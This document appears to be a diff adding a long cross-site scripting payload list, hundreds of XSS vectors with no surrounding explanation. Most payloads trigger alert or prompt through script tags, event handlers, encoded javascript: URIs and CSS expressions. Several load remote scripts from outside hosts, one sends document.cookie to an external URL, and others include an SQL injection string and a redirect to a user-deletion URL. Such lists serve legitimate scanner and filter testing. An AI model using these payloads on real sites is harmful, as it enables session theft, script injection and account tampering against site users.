+data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
+<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
+&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
+\x3Cscript>javascript:alert(1)</script>
+"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
+<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<;<;SCRIPT>;alert(";XSS";);//<;<;/SCRIPT>;
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
+"`'><script>\xC2\x85javascript:alert(1)</script>
+<;DIV STYLE=";background-image: url(javascript:alert(';XSS';))";>;
+<img src=``&NewLine; onerror=alert(1)&NewLine;
+'`"><\x00script>javascript:alert(1)</script>
+<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
+<img SRC='vbscript:document.vulnerable=true;'>
+<image src="javascript:alert(1)">
+<img src=x onerror=\x12"javascript:alert(1)">
+<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
+<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
+<<SCRIPT>%(payload)s//<</SCRIPT>
+"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
+&#x0003c
+#<script>alert(1)</script>
+<img src ?itworksonchrome?\/onerror = alert(1)
+<script>javascript:alert(1)</script>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:alert(';XSS';)";>;<;/B>;<;/I>;<;/XML>;
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
+http://www.google<script .com>alert(document.location)</script
+"><img src=x onerror=javascript:alert(`1`)>
+<IMG SRC="jav ascript:alert('XSS');">
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
+<form><button formaction="javascript:javascript:alert(1)">X
+&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
+<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
+<script\x2F>javascript:alert(1)</script>
+<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
+<script language='javascript' src='%(jscript)s'></script>
+&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
+<scrscriptipt>alert(1)</scrscriptipt>
+"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
+<BASE HREF="javascript:alert('XSS');//">
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
+<;A HREF=";//www.google.com/";>;XSS<;/A>;
+<BGSOUND SRC="javascript:javascript:alert(1);">
+<isindex/autofocus/onfocus=alert()>
+&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
+X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
+<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<IMG SRC=x ondrop="alert(String.fromCharCode(88,83,83))">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+“><<script>alert(document.cookie);//<</script>
+<sVg><scRipt >alert&lpar;1&rpar; {Opera}
+ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
+&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
+>"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>
+<svg onload="javascript:alert(123)" xmlns="#"></svg>
+<script ~~~>alert(0%0)</script ~~~>
+&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+&#X00003c;
+<img\x13src=x onerror="javascript:alert(1)">
+&#0000060
+javascript:alert("hellox worldss")
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
+<iframe src="javascript:alert(document.domain)"></iframe>
+ABC<div style="x:\x20expression(javascript:alert(1)">DEF
+a'-alert(1)//
+<;STYLE>;@im\port';\ja\vasc\ript:alert(";XSS";)';;<;/STYLE>;
+<%<!--'%><script>alert(1);</script -->
+<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
+"><img src=x onafterprint=prompt(document.domain);>
+</br style=a:expression(alert())>
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
+<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<BODY ONLOAD=alert('XSS')>
+&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
+<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
+&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+<table><TD BACKGROUND="javascript:document.vulnerable=true;">
+<img \x47src=x onerror="javascript:alert(1)">
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
+&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+<image src =q onerror=prompt(8)>
+&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+<embed src="javascript:alert(1)">
+<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
+&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
+<--`<img/src=` onerror=alert(1)> --!>
+'';!--"<XSS>=&{()}
+"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
+<img src=x\x10onerror="javascript:alert(1)">
+<img \x47src=x onerror="javascript:alert(1)">
+</script></script><<<<script><>>>><<<script>alert(123)</script>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
+<;IFRAME SRC=";javascript:alert(';XSS';);";>;<;/IFRAME>;
+<;br size=\";&;{alert(&#039;XSS&#039;)}\";>;
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
+<body BACKGROUND="javascript:document.vulnerable=true;">
+&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;
+<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
+<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
+&#x00003C
+<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
+<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
+<XSS STYLE="xss:expression(alert('XSS'))">
+<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+\x3Cscript>javascript:alert(1)</script>
+<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
+<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
+ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
+<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+<IMG SRC=x onblur="alert(String.fromCharCode(88,83,83))">
+<XSS STYLE="behavior: url(%(htc)s);">
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
+<;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
+<img src=# onerror\x3D"javascript:alert(1)" >
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+<;IMG SRC=';vbscript:msgbox(";XSS";)';>;
+%22%3e%3cscript%3ealert('XSS')%3c/script%3e
+<div/onmouseover='alert(1)'> style="x:">
+<img src=x\x11onerror="javascript:alert(1)">
+<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
+</ foo="><script>javascript:alert(1)</script>">
+<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
+\u003c
+<;IMG STYLE=";xss:expr/*XSS*/ession(alert(';XSS';))";>;
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
+<IMG onmouseover="alert('xxs')">
+a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
+<;IMG SRC=";javascript:alert(';XSS';);";>;
+<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
+<a href="about:<script>document.vulnerable=true;</script>">
+perl -e ';print ";&;<;SCR\0IPT>;alert(";XSS";)<;/SCR\0IPT>;";;'; >; out
+XSS STYLE=xss:e/**/xpression(alert('XSS'))>
+&#x00003C;
+&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
+<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
+<html><noalert><noscript>(123)</noscript><script>(123)</script>
+<img src ?itworksonchrome?\/onerror = alert(1)
+&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
+[color=red' onmouseover="alert('xss')"]mouse over[/color]
+XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
+&lt;
+ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
+<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
+<table background="javascript:javascript:alert(1)">
+<script itworksinallbrowsers>/*<script* */alert(1)</script
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<script SRC="http://www.securitycompass.com/xss.jpg"></script>
+&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
+<;/script>;<;script>;alert(1)<;/script>;
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
+<style type="text/javascript">document.vulnerable=true;</style>
+<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
+<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
+&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
+<img src\x12=x onerror="javascript:alert(1)">
+<img \x11src=x onerror="javascript:alert(1)">
+<script\x09type="text/javascript">javascript:alert(1);</script>
+<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<bgsound src="javascript:document.vulnerable=true;">
+<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<div onmouseover="document.vulnerable=true;">
+<svg/onload=alert(1)
+\x3c
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
+<img/src/onerror=prompt(8)>
+ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
+<![><img src="]><img src=x onerror=alert(XSS)//">
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<form><button formaction="javascript:alert(XSS)">lol
+`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
+<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script>/* *\x2A/javascript:alert(1)// */</script>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+<script src="\\%(jscript)s"></script>
+<img src=x onerror=\x11"javascript:alert(1)">
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+<img \x34src=x onerror="javascript:alert(1)">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
+<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
+<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
+&#X3C;
+<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
+<Svg On Only=1 Onload=alert("hex")>
+<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
+<BODY ONLOAD=javascript:alert(1)>
+<SCRIPT>document.write("XSS");</SCRIPT>
+<script x> alert(1) </script 1=2
+<IMG SRC=x ondragenter="alert(String.fromCharCode(88,83,83))">
+<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
+<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<!--[if]><script>javascript:alert(1)</script -->
+`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
+<frameset onload=javascript:alert(1)>
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+<img SRC="javascript:document.vulnerable=true;">
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;
+<img SRC=" &#14; javascript:document.vulnerable=true;">
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+"><img src=x onerror=javascript:alert((`1`))>
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<input type="image" dynsrc="javascript:document.vulnerable=true;">
+<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
+<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
+http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??
+<A HREF="http://66.102.7.147/">XSS</A>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<var onmouseover="prompt(1)">On Mouse Over</var>
+<svg><script onlypossibleinopera:-)> alert(1)
+<div style="background-image: url(javascript:document.vulnerable=true;);">
+&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
+<style><img src="</style><img src=x onerror=alert(123)//">
+&#000060
+<IMG SRC="jav    ascript:javascript:alert(1);">
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
+"><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
+"`'><script>\x0Ajavascript:alert(1)</script>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
+<;IMG SRC=";jav&;#x0D;ascript:alert(';XSS';);";>;
+"><img src=x onerror=javascript:alert(1)>
+<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+<script>javascript:alert(1)<\x00/script>
+<marquee/onstart=alert()>
+foo<script>alert(1)</script>
+<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
+<BASE HREF="javascript:alert('XSS');//">
+<;STYLE TYPE=";text/javascript";>;alert(';XSS';);<;/STYLE>;
+<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
+<!--[if]><script>javascript:alert(1)</script -->
+<style>*[{}@import'%(css)s?]</style>X
+<body onLoad="alert('XSS');"
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
+<;BR SIZE=";&;{alert(';XSS';)}";>;
+<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
+<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<BR SIZE="&{alert('XSS')}">
+&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
+&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
+<img \x47src=x onerror="javascript:alert(1)">
+&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
+<img src="blah"onmouseover="document.vulnerable=true;">
+<;BGSOUND SRC=";javascript:alert(';XSS';);";>;
+//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+<script src="data:\xCB\x8F,javascript:alert(1)"></script>
+<embed src=%(jscript)s></embed>
+<IMG SRC=x oncanplay="alert(String.fromCharCode(88,83,83))">
+<div style="font-family:'foo&#10;;color:red;';">XXX
+`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
+<script\x09type="text/javascript">javascript:alert(1);</script>
+<iframe src=http://ha.ckers.org/scriptlet.html <
+<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<svg/onload​=alert//&NewLine;(2)>
+<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+"`'><script>\x0Bjavascript:alert(1)</script>
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+'); alert('xss'); var x='
+<// style=x:expression\28javascript:alert(1)\29>
+<div onmouseover="document.vulnerable=true;">
+"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
+<title onpropertychange=javascript:alert(1)></title><title title=>
+<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>;
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<img SRC="jav ascript:document.vulnerable=true;">
+<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+'>//\\,<'>">">"*"
+confirm?.(1) 
+<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
+<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
+&LT;
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<xml src="javascript:document.vulnerable=true;">
